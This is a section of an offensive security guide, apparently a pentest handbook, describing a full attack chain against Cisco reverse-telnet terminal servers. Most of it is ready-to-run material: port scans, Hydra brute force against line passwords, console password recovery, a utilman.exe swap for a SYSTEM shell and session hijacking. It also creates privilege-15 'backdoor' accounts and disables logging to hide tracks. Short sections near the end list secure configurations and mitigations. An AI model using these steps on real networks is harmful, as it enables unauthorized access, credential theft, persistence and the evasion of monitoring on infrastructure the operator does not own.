# 2. CISCO REVERSE TELNET - COMPLETE ATTACK CHAIN <a name="cisco-reverse-telnet"></a>
 
## 2.1 THEORY & BACKGROUND
 
### What is Cisco Reverse Telnet?
 
**Definition**: A Cisco-specific feature that allows remote console access to devices connected to the router's serial/auxiliary ports via Telnet.
 
**Purpose**:
- Remote management of console ports
- Access to devices without network connectivity
- Terminal server functionality
- Out-of-band management
 
**How It Works**:
1. Cisco router/terminal server has multiple async ports (console/aux)
2. Devices (switches, routers, servers) connect to these ports via serial cables
3. Router configured to allow Telnet connections to specific ports
4. Telnet to router on port 2000+ connects to the physical device
 
**Port Mapping**:
```
Base port = 2000
Line number = X
Connection port = 2000 + X
 
Example:
Line 1 → Port 2001
Line 2 → Port 2002
Line 65 → Port 2065
```
 
**Architecture**:
```
[Attacker] --Telnet--> [Cisco Router:2001] --Serial--> [Target Device Console]
```
 
---
 
## 2.2 ENUMERATION PHASE
 
### 2.2.1 Identifying Reverse Telnet Configuration
 
**Port Scanning:**
```bash
# Scan for high ports (2000-2100 range)
nmap -p 2000-2100 -sV 192.168.1.1
 
# Results might show:
# 2001/tcp open  telnet  Cisco router telnetd
# 2002/tcp open  telnet  Cisco router telnetd
# 2003/tcp open  telnet  Cisco router telnetd
 
# Full range scan
nmap -p 2000-3000 -sV -T4 192.168.1.1
 
# With Cisco-specific scripts
nmap -p 2000-2100 --script telnet-*,banner 192.168.1.1
```
 
**Banner Analysis:**
```bash
# Connect to each port
for port in {2001..2010}; do
    echo "=== Port $port ===" >> reverse_telnet_scan.txt
    timeout 5 nc -vn 192.168.1.1 $port 2>&1 | head -20 >> reverse_telnet_scan.txt
done
 
# Check banners
cat reverse_telnet_scan.txt
# Look for device login prompts, not router prompts
```
 
**Identifying Connected Devices:**
```bash
# Login to the router first
telnet 192.168.1.1
# Or SSH if available
ssh admin@192.168.1.1
 
# Check line configuration
show line
 
# Output example:
# Tty Line Typ     Tx/Rx    A Roty AccO AccI  Uses   Noise  Overruns Int
#   1    1 TTY        -       -    -    -    -     0       0     0/0   -
#   2    2 TTY        -       -    -    -    -     5       0     0/0   -
# * 3    3 TTY        -       -    -    -    -     2       1     0/0   -
 
# Detailed line info
show line 1
show line 2
 
# Check reverse telnet settings
show running-config | section line
```
 
**Configuration Analysis:**
```bash
# After accessing router, check config
show running-config
 
# Look for:
line 1 16
 transport input telnet
 exec-timeout 0 0
 stopbits 1
 
# This indicates lines 1-16 accept telnet and are configured for reverse telnet
```
 
### 2.2.2 Mapping Physical Topology
 
**Understanding the Setup:**
```bash
# On the router
show line
 
# Create mapping:
# Line 1 (port 2001) → Switch 1
# Line 2 (port 2002) → Switch 2  
# Line 3 (port 2003) → Server 1
# etc.
 
# Document in file
echo "Port,Line,Device" > reverse_telnet_map.csv
echo "2001,1,Switch_Core" >> reverse_telnet_map.csv
echo "2002,2,Switch_Access_Floor2" >> reverse_telnet_map.csv
```
 
---
 
## 2.3 EXPLOITATION PHASE
 
### 2.3.1 Direct Access Attack
 
**Scenario: Unsecured Reverse Telnet Lines**
 
```bash
# Attempt direct connection
telnet 192.168.1.1 2001
 
# If no authentication on the line:
# You directly get console access to the connected device!
 
# Example output:
Switch1>
 
# Now you have console access to Switch1
enable
# Try default enable passwords or brute force
```
 
**Testing All Lines:**
```bash
# Script to test all reverse telnet ports
#!/bin/bash
for port in {2001..2020}; do
    echo "Testing port $port"
    (sleep 2; echo ""; sleep 2; echo "show version"; sleep 2) | telnet 192.168.1.1 $port > /tmp/output_$port.txt 2>&1
    
    if grep -q "Switch\|Router\|%" /tmp/output_$port.txt; then
        echo "Active device on port $port!"
        cat /tmp/output_$port.txt
    fi
done
```
 
### 2.3.2 Authentication Bypass Scenarios
 
**A. No Line Password Configured:**
```bash
# Configuration on router (vulnerable):
line 1
 transport input telnet
 no password
 no login
 
# Attack:
telnet 192.168.1.1 2001
# Direct console access!
```
 
**B. Line Password Configured (Weak):**
```bash
# Configuration:
line 1
 password cisco
 login
 
# Attack with Hydra:
hydra -l "" -P passwords.txt telnet://192.168.1.1:2001
 
# Or manual:
telnet 192.168.1.1 2001
# Password: cisco
```
 
**C. AAA Authentication:**
```bash
# Configuration:
line 1
 login authentication CONSOLE_AUTH
 
# Attack:
# Same as normal router telnet - need valid username/password
hydra -L users.txt -P passwords.txt telnet://192.168.1.1:2001
```
 
### 2.3.3 Privilege Escalation on Connected Devices
 
**Once Console Access is Obtained:**
 
**For Cisco Switches/Routers:**
```bash
# You're at console, typically privileged
Switch1>
enable
 
# If enable password required:
# 1. Try common passwords
cisco
Cisco
admin
password
 
# 2. Password recovery mode (if you have console access!)
# Send break signal during boot
# Ctrl + Break (on Windows)
# Ctrl + Shift + 6, then x (on Cisco terminal)
 
# In ROMMON mode:
confreg 0x2142
reset
 
# After reboot:
enable
configure terminal
enable secret NewPassword123
config-register 0x2102
end
copy running-config startup-config
 
# 3. Check for unprotected config
show startup-config
show running-config
# If accessible, look for passwords
```
 
**For Linux Servers:**
```bash
# Console access = physical access in many cases
# Boot parameters can be modified
 
# Access GRUB menu (if you can send keyboard input)
# Edit boot parameters:
# Add: init=/bin/bash
# Or: single
# Boot into single-user mode, no password required!
 
# Then:
mount -o remount,rw /
passwd root
# Set new root password
```
 
**For Windows Servers:**
```bash
# Console access through reverse telnet
# If you can send keystrokes:
 
# 1. Shift + F10 during Windows Setup (if accessible)
# 2. Access Command Prompt as SYSTEM
# 3. Replace utilman.exe with cmd.exe:
copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
 
# On login screen, click Accessibility
# CMD opens as SYSTEM
net user administrator NewPassword123
```
 
---
 
## 2.4 POST-EXPLOITATION
 
### 2.4.1 Persistence on Terminal Server
 
**Creating Backdoor Access:**
```bash
# Login to the Cisco router (terminal server)
telnet 192.168.1.1
 
enable
configure terminal
 
# Create backdoor account
username backdoor privilege 15 secret Backdoor123!
 
# Ensure reverse telnet stays enabled
line 1 16
 transport input telnet
 exec-timeout 0 0
 
# Optional: Remove logging to hide tracks
no logging console
no logging monitor
no logging buffered
 
# Save
end
write memory
```
 
### 2.4.2 Accessing Connected Devices
 
**Complete Attack Chain Example:**
 
```bash
# 1. Initial access to terminal server
ssh admin@192.168.1.1
# Password: cisco
 
# 2. Check connected devices
show line
show users
 
# 3. Identify target
# Line 5 = Core Switch
 
# 4. Calculate port
# Port = 2000 + 5 = 2005
 
# 5. Reverse telnet to target
telnet 192.168.1.1 2005
 
# 6. Now at console of Core Switch
Switch>enable
# Try passwords
 
# 7. Extract configuration
show running-config
 
# 8. Found SNMP community strings
snmp-server community public RO
snmp-server community private RW
 
# 9. Use SNMP to modify configuration remotely
# From another host:
snmpset -v2c -c private 192.168.1.50 ...
```
 
### 2.4.3 Pivoting Through Serial Connections
 
**Lateral Movement Strategy:**
 
```
[Attacker] → [Router via Telnet] → [Reverse Telnet Line 1] → [Switch 1]
                                 → [Reverse Telnet Line 2] → [Switch 2]
                                 → [Reverse Telnet Line 3] → [Server 1]
```
 
**Exploitation Flow:**
```bash
# Step 1: Compromise terminal server
telnet 192.168.1.1
# Credentials: admin:cisco
 
# Step 2: Access each connected device
telnet 192.168.1.1 2001  # Switch 1
telnet 192.168.1.1 2002  # Switch 2
telnet 192.168.1.1 2003  # Server 1
 
# Step 3: From Switch 1 console
enable
show running-config | include password
# Extract SNMP communities, VTY passwords, etc.
 
# Step 4: Use extracted credentials on other devices
# SSH to other switches using found credentials
 
# Step 5: Map entire network
show cdp neighbors detail
show lldp neighbors detail
```
 
---
 
## 2.5 ADVANCED EXPLOITATION TECHNIQUES
 
### 2.5.1 Session Hijacking
 
**Stealing Active Reverse Telnet Sessions:**
 
```bash
# On router, check current sessions
show users
 
# Output:
# Line       User       Host(s)              Idle       Location
# 2 vty 0   admin      idle                 00:00:00  192.168.1.100
#*3 vty 1   admin      idle                 00:00:05  192.168.1.101
 
# Kill existing session
clear line 2
 
# Immediately connect
telnet 192.168.1.1 2001
# You inherit the session state!
```
 
### 2.5.2 Break Sequence Exploitation
 
**Using Break Sequences for Password Recovery:**
 
```bash
# Telnet to reverse telnet line
telnet 192.168.1.1 2001
 
# Send break sequence
# From Linux telnet: Ctrl + ]
# Then type: send brk
 
# From PuTTY: Special Command → Break
 
# This interrupts boot process of connected device
# Allows ROMMON access = password recovery
 
# In ROMMON:
rommon 1 > confreg 0x2142
rommon 2 > reset
 
# After boot:
Switch>enable
Switch#configure terminal
Switch(config)#enable secret NewPassword
Switch(config)#config-register 0x2102
Switch(config)#end
Switch#write memory
```
 
---
 
## 2.6 CONFIGURATION ANALYSIS
 
**Secure vs Insecure Configurations:**
 
**INSECURE Configuration:**
```cisco
line 1 8
 transport input telnet
 no password
 no login
 exec-timeout 0 0
```
**Attack**: Direct access, no authentication
 
**WEAK Configuration:**
```cisco
line 1 8
 transport input telnet
 password cisco
 login
 exec-timeout 0 0
```
**Attack**: Weak password, brute forceable
 
**BETTER (but still vulnerable) Configuration:**
```cisco
line 1 8
 transport input telnet
 login authentication CONSOLE_AUTH
 exec-timeout 30 0
 access-class 10 in
!
aaa authentication login CONSOLE_AUTH local
!
access-list 10 permit 192.168.100.0 0.0.0.255
```
**Attack**: Still uses Telnet (cleartext), but requires authentication and ACL
 
**SECURE Configuration:**
```cisco
line 1 8
 transport input ssh
 login authentication CONSOLE_AUTH
 exec-timeout 10 0
 access-class 10 in
!
ip ssh version 2
ip ssh authentication-retries 2
!
aaa authentication login CONSOLE_AUTH local
aaa authorization exec CONSOLE_AUTHOR local
aaa accounting exec CONSOLE_ACCT start-stop local
```
**Much harder to attack**: SSH encryption, AAA, accounting, timeouts, ACLs
 
---
 
## 2.7 COMPLETE ATTACK SCENARIO
 
**Scenario: Compromising Data Center via Reverse Telnet**
 
**Initial Reconnaissance:**
```bash
# Nmap scan of router
nmap -p 1-3000 -sV 192.168.1.1
 
# Found:
# 23/tcp   open  telnet
# 2001/tcp open  telnet
# 2002/tcp open  telnet
# 2003/tcp open  telnet
# 2004/tcp open  telnet
```
 
**Attack Step 1: Access Terminal Server**
```bash
# Try default credentials on main telnet
telnet 192.168.1.1
# Username: cisco
# Password: cisco
# Success!
```
 
**Attack Step 2: Enumerate Lines**
```bash
Router>enable
Password: 
# No enable password!
 
Router#show line
 
#  Tty Line Typ     Tx/Rx    A Roty AccO AccI  Uses   Noise  Overruns Int
#    1    1 TTY        -       -    -    -    -    45       0     0/0   -
#    2    2 TTY        -       -    -    -    -    12       0     0/0   -
#    3    3 TTY        -       -    -    -    -     8       0     0/0   -
 
Router#show running-config | section line
 
# line 1 3
#  transport input telnet
#  password datacenter
#  login
```
 
**Attack Step 3: Access Connected Devices**
```bash
# Try line 1 (port 2001)
telnet 192.168.1.1 2001
Password: datacenter
 
# Got console access to CoreSwitch1!
CoreSwitch1>enable
# Try common passwords
Password: cisco
# Failed
 
Password: datacenter
# Success!
 
CoreSwitch1#show running-config
# Extract VLAN info, passwords, SNMP communities
 
# Line 2 (port 2002)
telnet 192.168.1.1 2002
Password: datacenter
 
# Got console access to CoreSwitch2!
```
 
**Attack Step 4: Extract Sensitive Data**
```bash
CoreSwitch1#show running-config | include password
enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0
username admin privilege 15 password 0 Admin123
 
CoreSwitch1#show vlan brief
# Document all VLANs
 
CoreSwitch1#show mac address-table
# Map devices to ports
 
CoreSwitch1#show cdp neighbors detail
# Map network topology
```
 
**Attack Step 5: Lateral Movement**
```bash
# Found admin password: Admin123
 
# Try on other devices
ssh admin@192.168.1.10
Password: Admin123
# Success! Password reuse on other switches
 
# From compromised switch, access management VLAN
Switch1#configure terminal
Switch1(config)#interface vlan 100
Switch1(config-if)#ip address 192.168.100.50 255.255.255.0
Switch1(config-if)#no shutdown
Switch1(config-if)#end
 
# Now can access management network
# Scan for other devices
Switch1#ping 192.168.100.1
```
 
**Attack Step 6: Persistence**
```bash
# On terminal server
Router#configure terminal
Router(config)#username backdoor privilege 15 secret Backdoor123!
Router(config)#line vty 0 4
Router(config-line)#login local
Router(config-line)#transport input ssh telnet
Router(config-line)#end
Router#write memory
 
# On each switch
CoreSwitch1#configure terminal
CoreSwitch1(config)#username backdoor privilege 15 secret Backdoor123!
CoreSwitch1(config)#end
CoreSwitch1#write memory
```
 
---
 
## 2.8 SECURITY IMPLICATIONS
 
### Vulnerabilities:
1. **Cleartext Communication**: Telnet protocol = no encryption
2. **Physical Layer Access**: Console access = highest privilege
3. **Weak Authentication**: Often no/weak passwords on lines
4. **Password Recovery**: Break sequences allow bypassing passwords
5. **Trust Relationships**: One compromised device → entire network
6. **Lack of Logging**: Reverse telnet sessions often not logged properly
 
### Attack Vectors:
- Direct console access through reverse telnet
- Break sequence for password recovery
- Session hijacking
- Credential reuse
- Lateral movement through connected devices
- VLAN hopping via console configuration
 
### Mitigation:
- Replace Telnet with SSH for reverse connections
- Strong authentication (AAA, RADIUS, TACACS+)
- Access control lists on lines
- Disable unnecessary lines
- Enable comprehensive logging
- Implement session timeouts
- Use out-of-band management networks
- Monitor for unauthorized access
- Disable password recovery if not needed
 
---